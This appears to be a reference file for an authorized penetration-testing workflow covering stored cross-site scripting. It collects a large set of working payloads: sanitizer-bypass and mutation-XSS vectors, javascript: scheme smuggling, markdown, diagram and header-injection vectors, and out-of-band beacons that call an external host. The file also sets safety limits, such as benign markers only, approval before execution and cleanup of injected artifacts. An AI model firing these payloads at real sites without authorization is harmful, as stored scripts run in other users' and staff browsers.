# Stored XSS payloads: output-context + sanitizer bypass (step 6)
# Stored XSS is usually filtered on OUTPUT (and the store may sanitize too). The payload that
# counts is the one that EXECUTES on the render surface after its encoder/sanitizer.
# Record every attempt in payloads_tried.jsonl: {candidate_id, render_surface, payload, stored, rendered, executed, viewer}.
# BENIGN confirmation only — stored payloads can hit real users (see SKILL §Safety).

## Confirmation payload — prefer OOB over alert (render surface may be an unseen admin view)
```
<img src=x onerror="new Image().src='https://OOB_HOST/s?'+encodeURIComponent(location.host+document.cookie.length)">
```
Fires on view, reports back which surface/viewer executed it — works even when you can't see
the admin render. `document.cookie.length` (not the cookie) keeps it benign.

## By render context (classify at the render surface, not the store)
- **HTML body:** `<svg onload=...>` · `<img src=x onerror=...>`
- **Attribute:** `"><svg onload=...>` · (unquoted) ` onmouseover=... `
- **JS string in an inline `<script>` that echoes stored data:** `'-...-'` · `';...//`
- **Markdown → HTML** (comments/wikis): `[x](javascript:...)` · raw HTML passthrough · `<img>` in MD
- **Attribute in a templated link:** `javascript:` in a stored URL field (avatar/website)

## Against HTML sanitizers (DOMPurify & friends) — mutation XSS
Sanitized-HTML surfaces (rich comments, wikis) strip obvious vectors; look for mXSS where the
browser re-parses sanitized output into something executable:
```
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=...>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=... src>">
<noscript><p title="</noscript><img src=x onerror=...>">
```
Also test: sanitizer version (retire.js/libraries.jsonl), `svg`/`mathml` namespaces, nested
`style`/`template`, and known-CVE bypasses for the specific sanitizer + version in use.

## Store-side gotchas
- length caps / truncation may cut the payload — use short vectors.
- the store may HTML-encode but the render may decode (double-decoding) — test the round trip.
- different render surfaces of the SAME stored value may have different contexts — test each.
- **a bundled sanitizer ≠ a sanitized sink.** A bundle can ship DOMPurify yet wire it to only ONE
  path (e.g. the markdown/rich-text renderer) and leave your sink raw — sanitization is frequently
  inconsistent across render paths in one app. Grep for the actual `.sanitize(` / purify call sites
  and confirm YOUR sink's value flows through one; don't assume it's safe because the lib is present.
- **innerHTML sinks + a handler-blocking WAF ⇒ mitigated, not exploitable.** An
  `innerHTML`/`insertAdjacentHTML` sink cannot execute a top-level `<script>`; it needs an event
  handler (`onerror`/`onload`/`ontoggle`) or an auto-exec foreign/allowed-tag vector. A WAF that
  signatures event-handler attributes therefore mitigates the sink even though inert tags (`<b>`,
  `<img src=x>` with no handler) pass with 200. Passing a tag through the WAF is NOT execution —
  rate exploitability on a handler/vector that actually survives both the WAF and the output filter.

Pick the lowest-complexity payload that survives the specific output filter; don't escalate to
mXSS until a simple vector is proven filtered. Confirm EXECUTION cross-session (verify.md).

---

## Extended arsenal — HTML-sanitizer bypass taxonomy
Classify the defense, then pick the class. A stored payload can hit real/admin viewers (SKILL §Safety)
— prefer `alert(document.domain)` for an in-view PoC and the OOB canary for an unseen admin render.
### Namespace confusion (HTML ↔ SVG ↔ MathML foreign content)
```
<svg><style><img src=x onerror=alert(document.domain)></style></svg>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>
<svg><annotation-xml encoding="text/html"><img src=x onerror=alert(document.domain)></annotation-xml></svg>
<math><annotation-xml encoding="application/xhtml+xml"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(document.domain)></body></annotation-xml></math>
```
### Allowed-tag abuse (sanitizer keeps the tag; you abuse its attributes)
```
<a href="javascript:alert(document.domain)">link</a>
<a href="data:text/html,<script>alert(document.domain)</script>">x</a>
<img src=x onerror=alert(document.domain)>                 # if on* survives
<form action="javascript:alert(document.domain)"><button>go</button></form>
<iframe srcdoc="&lt;svg onload=alert(document.domain)&gt;"></iframe>    # srcdoc double-decode
<details open ontoggle=alert(document.domain)>
<xss style="animation-name:x" onanimationstart=alert(document.domain)></xss><style>@keyframes x{}</style>
```
### Attribute-injection / quote-break (value lands in a templated attribute after sanitize)
```
"><img src=x onerror=alert(document.domain)>
" onmouseover=alert(document.domain) x="
```
### Scheme smuggling in URL-bearing fields (avatar / website / link)
```
javascript:alert(document.domain)
javascript:alert(document.domain)//
 javascript:alert(document.domain)         # leading whitespace/control chars
java&#09;script:alert(document.domain)
data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=
```
### mXSS on re-serialization (sanitize → innerHTML round-trip)
```
<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
<listing>&lt;img src=x onerror=alert(document.domain)&gt;</listing>
<svg></p><title><a id="</title><img src=x onerror=alert(document.domain)>">
```
### Config / version pivots
- Fingerprint the sanitizer + version (retire.js / libraries.jsonl / bundle strings). Bypass classes are
  tied to specific minor versions — a vector that fires on an old build is patched in a newer one; confirm
  against the live build.
- Test store-side and render-side filters independently (double-decoding: stored encoded, rendered decoded).

## Extended arsenal — stored vectors by store→render surface
### Rich-text / WYSIWYG (comments, wikis, tickets)
```
<a href="javascript:alert(document.domain)">styled</a>
<span style="background:url(javascript:alert(document.domain))">x</span>    # legacy
# paste-as-HTML path that bypasses the editor's own sanitizer
```
### Markdown → HTML
```
[x](javascript:alert(document.domain))
[x](java%0ascript:alert(document.domain))
![x](x"onerror="alert(document.domain))                 # image title-attr break
<img src=x onerror=alert(document.domain)>             # raw-HTML passthrough if allowed
[ref]: javascript:alert(document.domain)               # reference-style link
<https://HOST"><svg onload=alert(document.domain)>     # autolink attribute break
```
### Uploaded files served inline (high value)
```
# .svg served as image/svg+xml and rendered in-page (not via <img>):
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
# .html/.xhtml upload served same-origin → full XSS
# .xml with an xml-stylesheet → scripted transform (engine-dependent)
# EXIF/metadata (author/comment/XPKeywords) rendered in a gallery/admin → inject there
# filename rendered unescaped:  "><svg onload=alert(document.domain)>.jpg
```
### Header-sourced stored XSS (fires in admin log/analytics viewers)
```
User-Agent: <svg/onload=alert(document.domain)>
Referer: https://HOST/"><svg onload=alert(document.domain)>
X-Forwarded-For: <img src=x onerror=alert(document.domain)>
```
Viewer is usually staff → prefer the OOB canary (unseen surface); pair with header probing in the context feeder.
### Second-order into email / PDF
```
# benign when stored, later rendered into an invoice/report PDF or an HTML email whose engine runs JS:
<img src=x onerror="new Image().src='//TOKEN.oob.example/pdf?'+document.domain">
```
Some PDF/office and mail renderers execute JS during generation — the OOB token attributes the fire even
though you never see the render.

## Extended arsenal — stored confirmation & hygiene
- Prefer an OOB canary carrying a per-injection token + `document.domain` so an unseen admin/staff render
  is attributable (verify.md rejects ambiguous callbacks).
- `document.domain` / `document.cookie.length` (a number) only — never the cookie value or real user data.
- Keep a short greppable alnum marker alongside to locate WHERE it rendered without execution.
- Record every injected artifact in cleanup.md for removal (stored payloads persist for real users).

---

## Extended arsenal — diagram & documentation renderers (beyond Markdown)
Doc / wiki / ticket surfaces often run MORE than Markdown — each doc markup has its own link sink, and
diagram renderers parse a mini-language that can emit links / HTML / inline SVG. Fingerprint the
renderer (+ version), then pick the sink. Benign marker only.
### Documentation-markup link sinks (`javascript:` / `data:` in a URL position)
```
RDoc:               {text}[javascript:alert(document.domain)]
Textile:            "text":javascript:alert(document.domain)
BBCode:             [url=javascript:alert(document.domain)]text[/url]
reStructuredText:   `text <javascript:alert(document.domain)>`_
AsciiDoc:           link:javascript:alert(document.domain)[text]
MediaWiki/wikitext: [javascript:alert(document.domain) text]        # external-link syntax
```
Many renderers allowlist schemes on OUTPUT — defeat a naive check with `data:text/html`, an
entity/space-smuggled scheme (`java&#09;script:`), or `javascript://%0aalert(document.domain)`
(see scheme-smuggling above).
### Diagram renderers (server- or client-side; render user text into SVG/HTML)
```
# Mermaid (needs securityLevel != 'strict'; label-HTML + click/link are version-dependent):
click NodeId "javascript:alert(document.domain)"
A["<img src=x onerror=alert(document.domain)>"]
# PlantUML / Kroki — link on a node:
@startuml
url of A is [[javascript:alert(document.domain)]]
@enduml
# Graphviz/DOT (e.g. via Kroki) — node URL attribute:
digraph{ a[URL="javascript:alert(document.domain)"] }
```
A diagram endpoint that returns **SVG served same-origin inline** is an SVG-upload XSS surface — treat
it as such (cookie-scope impact). Pin the renderer version (bundle string / `libraries.jsonl`):
label/HTML support and the default `securityLevel` differ across versions.

---

## The approved NON-executing marker set (the store-probe envelope — do NOT drift past it)
Steps 3 + 6 probe the **store/output sanitizer**. The probe that does that is a benign marker whose job is
to reveal how the server **treats** markup — stored raw / entity-encoded / stripped / annotated to safe
markup — **without attempting execution**. That observation does NOT need an execution approval, so it is
the default. Keep the validation/tracer marker inside this inert set:

- **Inert tags** (no event handler, no active scheme): `<b>`, `<i>`, `<u>`, `<x>`, a custom `<rsmark>`
  tag, `<img src=x>` **without** `onerror`. They show whether tag *structure* survives storage/render.
- **Raw metacharacters** (bare, not forming an executing construct): `<`, `>`, `"`, `'`, `` ` ``, `=`, `/`
  — to see entity-encoding vs pass-through — paired with a short greppable alnum token (`rsxb<rand>`).
- A representative combined marker: `<i>rsxb7df5d</i> "'><rsmark>` — inert tag + quote/bracket break +
  a custom tag, all NON-executing. This is what a `validate`/tracer probe should carry.

**Escalation past the inert set is an EXECUTION probe and needs a SEPARATE approval on a NON-PUBLIC
surface.** A `<script>` element, ANY event-handler attribute (`onerror`/`onload`/`ontoggle`/`onmouseover`/
…), a `javascript:` / `data:text/html` scheme, or an auto-exec foreign/allowed-tag vector is an attempt to
**prove execution**, not to observe storage treatment. Because stored payloads can fire on **real users/
staff** (SKILL §Safety), such a payload is fired only **after** an execution-proof approval (`no_destructive`
+ `prod_touch_requires_approval`, `roe-gate.md`) and only against a surface **you alone render** — your own
pending/test-account view — never a shared or other-user render. A validate-probe marker must not quietly
grow a `<script>`/`<img onerror>`/`javascript:` body to "save a round trip"; that is exactly the drift an
external guardrail should never have had to catch.

---

## Passive-at-scale store-side corroboration (when the active write path is GATED) — a first-class technique
The active submit is sometimes un-testable: CAPTCHA-gated, human-moderated, invite-only, or the session
expired mid-run. **Do not stall or call the class "unconfirmed" — resolve the decisive storage-treatment
fact PASSIVELY, read-only, with ZERO writes**, by scanning the **existing persisted corpus at scale** and
measuring how the server's STORED form treats markup. The decisive question ("does a full `<tag>` / URL /
annotation survive storage+moderation to reach the render sink?") is answered by the corpus itself:

1. Enumerate many existing persisted items of the same type (comments, reviews, profiles, Q&A, posts)
   across the surface — fetch them via `rs_http.py` at a WAF-safe pace, Burp egress (no writes).
2. For each stored `body`, count: tag-shaped (`<…>`), URL-shaped (`http(s)://`, `www.`), entity-encoded
   (`&lt;`/`&gt;`/`&amp;`), the client-parser **annotation classes** (`class="link"`/`"mention"`), plain
   `@name` mentions (text, not markup), and stray single `<`/`>` (conversational `-->`, `=>`).
3. **Interpret:** a corpus of thousands of real items with **ZERO** surviving tags / URLs / annotation
   classes is decisive evidence the storage+moderation pipeline **strips markup before storage** → the
   stored-XSS path is **REFUTED** without a single write. Mentions kept as plain `@name` text (client
   linkifies by regex at render) and stray brackets that never form a tag corroborate "strips tag
   structure, not entity-encodes". Record `n`, the counts, and a few sample IDs as the evidence artifact
   (e.g. `passive_storage_scan.jsonl` + a `passive_storage_summary.md`).

**Honest caveat (does NOT flip the verdict):** passive inference proves that *normal* markup does not
survive; it cannot by itself disprove a crafted **mutation-XSS (mXSS)** that evades the stripper and
re-forms inside the render-side parser. That residual, low-probability angle is the ONLY thing an approved
benign-marker execution test on a **non-public** surface (store the inert-set marker → read back your OWN
pending item) would still add — deprioritize it against other leads, but state it.

**Generalize** — this is the persist→render analogue of "observe behavior before you act": when the active
write is gated for any **persisted** class (stored-XSS, stored/second-order SQLi candidates, stored
open-redirect / SSRF URL fields), **scan the existing persisted content at scale to observe the server's
storage/sanitization treatment BEFORE or INSTEAD of an active post** — the stored corpus is free, honest,
zero-write evidence that often settles the class on its own.
